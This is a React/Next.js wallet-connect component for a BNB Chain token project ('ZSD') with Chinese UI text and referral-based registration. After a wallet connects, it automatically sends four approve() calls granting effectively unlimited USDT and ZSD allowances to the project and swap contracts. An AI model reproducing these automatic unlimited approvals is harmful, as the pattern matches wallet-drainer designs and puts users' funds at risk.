"use client";
import React, { useState, useEffect } from "react";
import { message, Modal, Input, Form, Button, Row, Col } from "antd";
import { createWallet, walletConnect } from "thirdweb/wallets";
import { ConnectButton } from "thirdweb/react";
import { bsc } from "thirdweb/chains";
import { client } from "../../src/app/client";
import type { Metadata } from "next";
import styles from "./index.module.scss";

import {
  getContract,
  prepareContractCall,
  sendAndConfirmTransaction,
  readContract,
  toWei,
} from "thirdweb";
import { approve, allowance } from "thirdweb/extensions/erc20";
import { sendTransaction } from "thirdweb";
import { APIConfig } from "../../abi/APIConfiguration";
import { USDTAbi } from "../../abi/USDTAbi";
import { ZSDABI } from "../../abi/ZSDABI";
import { ZSDSwapABI } from "../../abi/ZSDSwapABI";
import { ZSDPROJECTABI } from "../../abi/ZSDPROJECTABI";
import { useActiveAccount } from "thirdweb/react";
import { debug } from "console";

const contractABI: any = USDTAbi;
const contractZSDPROJECTABI: any = ZSDPROJECTABI;
const contractZSDABI: any = ZSDABI;
const contractZSDWapABI: any = ZSDSwapABI;


export const metadata: Metadata = {
  title: "ZSD",
  description:
    "Starter template for using thirdweb SDK with Next.js App router",
};

const wallets: any = [
  createWallet("io.metamask"),
  createWallet("pro.tokenpocket"),
  createWallet("im.token"),
  createWallet("com.binance"),
  createWallet("com.coinbase.wallet"),
  walletConnect(),
];

//USDT
const USDT = getContract({
  client: client,
  address: APIConfig.USDTaddress,
  chain: bsc,
  abi: contractABI,
});

// ZSD
const ZSD = getContract({
  client: client,
  address: APIConfig.ZSDaddress,
  abi: contractZSDABI,
  chain: bsc,
});

// ZSDProject
const ZSDProjectfun = getContract({
  client: client,
  address: APIConfig.ZSDPROJECTAddress,
  chain: bsc,
  abi: contractZSDPROJECTABI,
});

// ZSDWAP
// const ZSDContract = getContract({
//   client: client,
//   address: APIConfig.ZSDSwapAddress,
//   chain: bsc,
//   abi: contractZSDWapABI
// });

const CallWallet = () => {
  const [isModalOpen, setIsModalOpen] = useState<boolean>(false);
  const [form] = Form.useForm();
  const account: any = useActiveAccount();

  const handleOk = () => {
    setIsModalOpen(false);
  };

  const handleCancel = async () => {
    try {
      wallets.forEach((wallet: { disconnect: (arg0: any) => void; }) => {
        if (wallet.disconnect) {
          wallet.disconnect(wallet);
        }
      });
      message.error('未填写邀请码，钱包已登出');
      setIsModalOpen(false);
    } catch (error) {
      message.error('登出钱包失败，请重试。');
    }
  };

  // 授权
  const AccreditFun = async () => {
    const balance: any = 10000000000000000000000000 * 10 ** 18;
    // 第一次USDT授权
    const accreditUSDT = prepareContractCall({
      contract: USDT,
      method: "function approve(address, uint256) returns (bool)",
      params: [APIConfig.ZSDPROJECTAddress, balance],
    });
    await sendAndConfirmTransaction({
      transaction: accreditUSDT,
      account: account
    });

    // 第二次ZSD授权
    const accreditZSD = prepareContractCall({
      contract: ZSD,
      method: "function approve(address, uint256) returns (bool)",
      params: [APIConfig.ZSDPROJECTAddress, balance],
    });
    await sendAndConfirmTransaction({
      transaction: accreditZSD,
      account: account
    });

    // 第三次ZSDWAP授权
    const txZsd = prepareContractCall({
      contract: USDT,
      method: "function approve(address, uint256) returns (bool)",
      params: [APIConfig.ZSDSwapAddress, balance],
    });
    await sendAndConfirmTransaction({
      transaction: txZsd,
      account: account
    });

    // 第四次project授权
    const txZSDWAP = prepareContractCall({
      contract: ZSD,
      method: "function approve(address, uint256) returns (bool)",
      params: [APIConfig.ZSDSwapAddress, balance],
    });
    await sendAndConfirmTransaction({
      transaction: txZSDWAP,
      account: account
    });
  }
  // 登录后判断用户是否注册
  const WhetherInviteUsers = async () => {
    if (!account) {
      message.error("请登录");
      return;
    }
    const search = window.location.search;
    const params = new URLSearchParams(search);
    const Inviteaddress: any = params.get("ref");

    try {
      const registerTX = prepareContractCall({
        contract: ZSDProjectfun,
        method: "function register(address)",
        params: [Inviteaddress ? Inviteaddress : account.address],
      });
      const registerTXResult = await sendAndConfirmTransaction({
        transaction: registerTX,
        account: account,
      });
      // 授权
      AccreditFun()
    } catch (error: any) {
      const firstLine = error.toString().split("\n")[0];
      const match = firstLine.match(/TransactionError: Error - (.+)/);
      if (match && match[1]) {
        switch (match[1]) {
          case "referrer has not deposited":
            message.info("邀请人没有入金");
            break;
          case "User already registered":
            break;
          case "You cannot refer":
            message.error("请输入邀请人地址");
            setIsModalOpen(true);
            break;
        }
      }
    }
  }

  useEffect(() => {
    if (account) {
      WhetherInviteUsers()
    }
  }, [account]);

  return (
    <div>
      <ConnectButton
        theme={"dark"}
        client={client}
        wallets={wallets}
        connectModal={{ size: "compact" }}
        chain={bsc}
      />
      {
        <Modal
          title=""
          open={isModalOpen}
          onOk={handleOk}
          onCancel={handleCancel}
          destroyOnClose={true}
          width={"90%"}
          style={{ margin: 'auto', top: '20%' }}
          footer={
            <div style={{ display: "flex", justifyContent: "space-between" }}>
              <Button onClick={handleCancel} className={styles.Cancelstyle}>
                取消
              </Button>
              <Button
                className={styles.verifystyle}
                htmlType="submit"
              // onClick={onFriendRechargeFun}
              >
                确认
              </Button>
            </div>
          }
        >
          <Form form={form} name="friendRechargeForm">
            <Row>
              <div className={styles.Topmodel}>邀请人地址</div>
              <Col span={24}>
                <Form.Item name="Invitelink">
                  <Input
                    className={styles.inputstyle}
                    placeholder="请填写/粘帖邀请链地址"
                  />
                </Form.Item>
              </Col>
            </Row>
          </Form>
        </Modal>
      }
    </div>
  );
};

export default CallWallet;